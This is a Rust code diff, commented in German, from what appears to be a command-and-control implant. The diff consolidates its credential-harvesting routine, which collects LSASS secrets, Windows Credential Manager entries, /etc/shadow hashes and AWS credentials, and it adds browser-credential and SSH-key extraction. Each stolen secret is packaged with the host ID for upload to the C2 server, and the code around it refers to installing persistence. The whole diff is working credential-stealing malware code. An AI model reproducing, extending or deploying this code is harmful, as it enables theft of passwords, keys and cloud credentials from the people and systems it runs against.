@@ -278,88 +278,58 @@ async fn main() {
 ///
 /// Jedes Secret bekommt die Host-Kennung des Agenten mit — die Kennung des Hosts,
 /// bei dem es erbeutet wurde. Das ist hier der Agent selbst.
+///
+/// Die Extraktoren liefern dieselbe Form (`kx_core::secret::Secret`), deshalb
+/// ist der Weg von der Extraktion zum Upload eine Schleife statt vier
+/// kopierter Blöcke. Die Quelle des Stücks steht im Secret — sie kommt vom
+/// Extraktor, der sie am besten kennt.
 async fn collect_local_secrets(
     host_id: &str,
     schluessel: Option<hostkey::SealedHostKey>,
 ) -> Vec<kx_core::c2::SecretUpload> {
-    let mut out = Vec::new();
+    let mut secrets: Vec<kx_core::secret::Secret> = Vec::new();
     #[cfg(target_os = "windows")]
     {
-        for secret in kx_win::extract_lsass().await.unwrap_or_default() {
-            let (versiegelt, klartext) = versiegel(&schluessel, &secret.value);
-            out.push(
-                kx_core::c2::SecretUpload {
-                    host_id: host_id.to_string(),
-                    cred_type: secret.secret_type,
-                    username: secret.target,
-                    password: String::new(),
-                    source: Some("lsass".into()),
-                    master_key: None,
-                    sealed_password: None,
-                }
-                .mit_versiegeltem_passwort(versiegelt)
-                .mit_passwort(&klartext),
-            );
-        }
-        for secret in kx_win::extract_credential_manager()
-            .await
-            .unwrap_or_default()
-        {
-            let (versiegelt, klartext) = versiegel(&schluessel, &secret.value);
-            out.push(
-                kx_core::c2::SecretUpload {
-                    host_id: host_id.to_string(),
-                    cred_type: "credential_manager".into(),
-                    username: secret.target,
-                    password: String::new(),
-                    source: Some("cmdkey".into()),
-                    master_key: None,
-                    sealed_password: None,
-                }
-                .mit_versiegeltem_passwort(versiegelt)
-                .mit_passwort(&klartext),
-            );
-        }
+        secrets.extend(kx_win::extract_lsass().await.unwrap_or_default());
+        secrets.extend(
+            kx_win::extract_credential_manager()
+                .await
+                .unwrap_or_default(),
+        );
+        secrets.extend(
+            kx_win::extract_browser_credentials()
+                .await
+                .unwrap_or_default(),
+        );
     }
     #[cfg(unix)]
     {
-        for secret in kx_posix::extract_shadow_hashes().await.unwrap_or_default() {
-            let (versiegelt, klartext) = versiegel(&schluessel, &secret.value);
-            out.push(
-                kx_core::c2::SecretUpload {
-                    host_id: host_id.to_string(),
-                    cred_type: "shadow".into(),
-                    username: secret.target,
-                    password: String::new(),
-                    source: Some("/etc/shadow".into()),
-                    master_key: None,
-                    sealed_password: None,
-                }
-                .mit_versiegeltem_passwort(versiegelt)
-                .mit_passwort(&klartext),
-            );
-        }
-        for secret in kx_posix::extract_aws_credentials()
-            .await
-            .unwrap_or_default()
-        {
-            let (versiegelt, klartext) = versiegel(&schluessel, &secret.value);
-            out.push(
-                kx_core::c2::SecretUpload {
-                    host_id: host_id.to_string(),
-                    cred_type: "aws".into(),
-                    username: secret.target,
-                    password: String::new(),
-                    source: Some("~/.aws/credentials".into()),
-                    master_key: None,
-                    sealed_password: None,
-                }
-                .mit_versiegeltem_passwort(versiegelt)
-                .mit_passwort(&klartext),
-            );
-        }
+        secrets.extend(kx_posix::extract_shadow_hashes().await.unwrap_or_default());
+        secrets.extend(kx_posix::extract_ssh_keys().await.unwrap_or_default());
+        secrets.extend(
+            kx_posix::extract_aws_credentials()
+                .await
+                .unwrap_or_default(),
+        );
     }
-    out
+
+    secrets
+        .into_iter()
+        .map(|secret| {
+            let (versiegelt, klartext) = versiegel(&schluessel, &secret.value);
+            kx_core::c2::SecretUpload {
+                host_id: host_id.to_string(),
+                cred_type: secret.secret_type,
+                username: secret.target,
+                password: String::new(),
+                source: Some(secret.source),
+                master_key: None,
+                sealed_password: None,
+            }
+            .mit_versiegeltem_passwort(versiegelt)
+            .mit_passwort(&klartext)
+        })
+        .collect()
 }
 
 /// Installiert Persistenz (Windows oder POSIX).
